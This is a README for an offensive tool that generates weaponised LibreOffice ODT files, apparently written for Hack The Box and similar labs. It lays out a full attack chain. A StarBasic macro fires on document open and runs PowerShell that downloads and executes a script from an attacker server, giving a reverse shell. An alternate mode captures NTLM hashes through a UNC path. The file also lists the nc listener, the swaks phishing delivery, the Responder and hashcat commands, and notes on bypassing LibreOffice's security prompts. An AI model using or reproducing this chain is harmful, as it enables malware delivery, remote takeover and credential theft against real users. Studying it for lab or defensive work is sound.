# LibreOffice ODT Weaponizer

> ⚠️ **For authorized penetration testing and CTF use only. See [Disclaimer](#disclaimer) below.**

A Python tool for generating malicious `.odt` (OpenDocument Text) files that execute a payload when opened in LibreOffice. Based on the exact Metasploit `openoffice_document_macro` skeleton — a real OpenOffice-generated structure that LibreOffice trusts implicitly.

Originally developed for **HTB: Job** and similar machines involving internal mail servers and document processing pipelines. | It works against other machines including offsec's PG machines with no issues (Tested).

---

## How It Works

The ODT format is a ZIP archive containing XML files. LibreOffice supports embedded Basic macros with event listeners that fire on `dom:load` (document open). This tool:

1. Builds a valid ODT using the Metasploit-trusted skeleton structure
2. Embeds a StarBasic macro wired to the `dom:load` event
3. The macro calls `Shell()` to execute a PowerShell one-liner
4. PowerShell fetches and executes `shell.ps1` from an attacker-controlled HTTP server
5. `shell.ps1` connects back with a reverse shell

---

## Modes

| Mode         | Description                                                        |
|--------------|--------------------------------------------------------------------|
| `macro`      | Macro fires on open → `IEX DownloadString(shell.ps1)` → rev shell |
| `responder`  | Embeds a UNC path → triggers NTLM authentication → capture hash   |

## Usage

```bash
# Macro mode (reverse shell) with auto HTTP server
python3 gen_odt.py --mode macro -i lhost -p lport --serve --target 10.129.234.73 # --target will give you a read to send swaks command against that ip

# Responder mode (NTLM hash capture)
python3 gen_odt.py --mode responder -i 10.10.14.5 --target 10.129.234.73 # mainly for getting the ntlmv2 hash
```

### Arguments

| Flag            | Description                               | Default            |
|-----------------|-------------------------------------------|--------------------|
| `--mode`        | `macro` or `responder`                    | `macro`            |
| `-i / --lhost`  | Your attacker IP (tun0)                   | *(required)*       |
| `-p / --lport`  | Reverse shell listener port               | `443`              |
| `--http-port`   | Port for the PS1 HTTP server              | `80`               |
| `-o / --output` | Output ODT filename                       | `resume.odt`       |
| `--target`      | Target IP (used in swaks command hint)    | `<TARGET_IP>`      |
| `--to`          | Recipient email (used in swaks hint)      | `career@job.local` |
| `--serve`       | Auto-start HTTP server (macro mode only)  | `false`            |

## Full Attack Flow — Macro Mode

```bash
# 1. Generate the ODT and start HTTP server
python3 gen_odt.py --mode macro -i 10.10.14.5 -p 443 --serve --target 10.129.x.x

# 2. Start listener
rlwrap nc -lnvp 443

# 3. Deliver via SMTP OR in some machines, file upload. will work either way.
swaks --to career@job.local \
      --from attacker@evil.com \
      --header "Subject: Job Application" \
      --body "Please find my CV attached." \
      --attach @resume.odt \
      --server 10.129.x.x
```

**Execution chain:**

```
Document opened
  └─ dom:load event fires
       └─ OnLoad() → GetOS() check
            └─ Exploit() → Shell(cmd /C powershell IEX DownloadString)
                 └─ HTTP GET /shell.ps1 → reverse shell → nc listener
```

## Attack via Responder Mode

```bash
# 1. Start Responder
sudo responder -I tun0 -v

# 2. Generate ODT with UNC path
python3 gen_odt.py --mode responder -i 10.10.14.5 --target 10.129.x.x

# 3. Deliver via SMTP (same swaks command)

# 4. Crack captured hash
hashcat -m 5600 hashes.txt /usr/share/wordlists/rockyou.txt
```

## Technical Notes

- The `mimetype` entry must be the **first file in the ZIP and stored uncompressed** — required by the ODT spec and validated by LibreOffice on open.
- The macro skeleton originates from `rapid7/metasploit-framework` and was generated by a real OpenOffice 4.1.3 instance, which is why LibreOffice accepts it without security prompts.
- `&apos;` XML escaping is used for the URL in the shell command to keep the macro XML valid.
- `GetOS()` uses `getGUIType()` to detect the OS — the payload fires on Windows (1), macOS (3), and Linux (4).
